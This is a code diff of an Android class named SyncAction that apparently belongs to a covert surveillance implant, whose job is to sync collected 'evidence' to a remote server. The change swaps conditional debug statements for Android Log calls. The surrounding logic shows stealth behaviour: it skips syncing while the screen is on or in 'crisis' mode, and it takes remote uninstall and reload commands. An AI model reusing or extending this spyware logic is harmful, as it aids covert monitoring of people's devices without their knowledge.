@@ -10,6 +10,8 @@ package com.ht.RCSAndroidGUI.action;
 
 import java.util.Vector;
 
+import android.util.Log;
+
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.action.sync.Protocol;
 import com.ht.RCSAndroidGUI.action.sync.ProtocolException;
@@ -27,6 +29,8 @@ import com.ht.RCSAndroidGUI.utils.Check;
  */
 public abstract class SyncAction extends SubAction {
 
+	private static final String TAG = "SyncAction";
+
 	/** The log collector. */
 	protected EvidenceCollector logCollector;
 
@@ -41,13 +45,8 @@ public abstract class SyncAction extends SubAction {
 
 	/** The initialized. */
 	protected boolean initialized;
-
-	// #ifdef DEBUG
 	/** The debug. */
 	protected static Debug debug = new Debug("SyncAction");
-
-	// #endif
-
 	/**
 	 * Instantiates a new sync action.
 	 * 
@@ -75,22 +74,15 @@ public abstract class SyncAction extends SubAction {
 	 */
 	@Override
 	public boolean execute() {
-		// #ifdef DBC
 		Check.requires(protocol != null, "execute: null protocol");
 		Check.requires(transports != null, "execute: null transports");
-		// #endif
-
 		if (status.synced == true) {
-			// #ifdef DEBUG
-			debug.warn("Already synced in this action: skipping");
-			// #endif
+			Log.w(TAG,"Already synced in this action: skipping");
 			return false;
 		}
 
 		if (status.crisisSync()) {
-			// #ifdef DEBUG
-			debug.warn("SyncAction - no sync, we are in crisis");
-			// #endif
+			Log.w(TAG,"SyncAction - no sync, we are in crisis");
 			return false;
 		}
 
@@ -98,8 +90,6 @@ public abstract class SyncAction extends SubAction {
 		if (status.backlight()) {
 			return false;
 		}
-		// #endif
-
 		wantReload = false;
 		wantUninstall = false;
 
@@ -109,16 +99,10 @@ public abstract class SyncAction extends SubAction {
 
 		for (int i = 0; i < transports.size(); i++) {
 			final Transport transport = (Transport) transports.elementAt(i);
-
-			// #ifdef DEBUG
-			debug.trace("execute transport: " + transport);
-			debug.trace("transport Sync url: " + transport.getUrl());
-			// #endif
-
+			Log.d(TAG,"execute transport: " + transport);
+			Log.d(TAG,"transport Sync url: " + transport.getUrl());
 			if (transport.isAvailable()) {
-				// #ifdef DEBUG
-				debug.trace("execute: transport available");
-				// #endif
+				Log.d(TAG,"execute: transport available");
 				protocol.init(transport);
 
 				try {
@@ -126,35 +110,21 @@ public abstract class SyncAction extends SubAction {
 					wantUninstall = protocol.uninstall;
 					wantReload = protocol.reload;
 				} catch (final ProtocolException e) {
-					// #ifdef DEBUG
-					debug.error(e);
-					// #endif
+					Log.e(TAG,e.toString());
 					ret = false;
 				}
-				// #ifdef DEBUG
-				debug.trace("execute protocol: " + ret);
-				// #endif
-
+				Log.d(TAG,"execute protocol: " + ret);
 			} else {
-				// #ifdef DEBUG
-				debug.trace("execute: transport not available");
-				// #endif
+				Log.d(TAG,"execute: transport not available");
 			}
 
 			if (ret) {
-				// #ifdef DEBUG
-				debug.info("SyncAction OK");
+				Log.i(TAG,"SyncAction OK");
 				Evidence.info("Synced with url:" + transport.getUrl());
-				// #endif
-
 				status.synced = true;
 				return true;
 			}
-
-			// #ifdef DEBUG
-			debug.error("SyncAction Unable to perform");
-			// #endif
-
+			Log.e(TAG,"SyncAction Unable to perform");
 		}
 
 		return false;
